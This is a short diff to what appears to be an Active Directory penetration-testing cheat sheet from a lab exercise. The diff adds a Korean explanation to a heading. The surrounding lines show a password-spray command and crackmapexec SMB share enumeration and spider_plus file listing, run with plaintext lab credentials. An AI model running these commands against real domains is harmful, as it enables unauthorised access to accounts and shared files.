@@ -155,7 +155,7 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 ### Share Enumeration - Domain Controller
 ```sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares```
 
-#### Share Enumeration - Spider_plus
+#### Share Enumeration - Spider_plus (각 읽기 가능한 공유를 파고들어 모든 읽기 가능한 파일을 나열)
 ```sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'```<br/>
 ```head -n 10 /tmp/cme_spider_plus/172.16.5.5.json ```
 
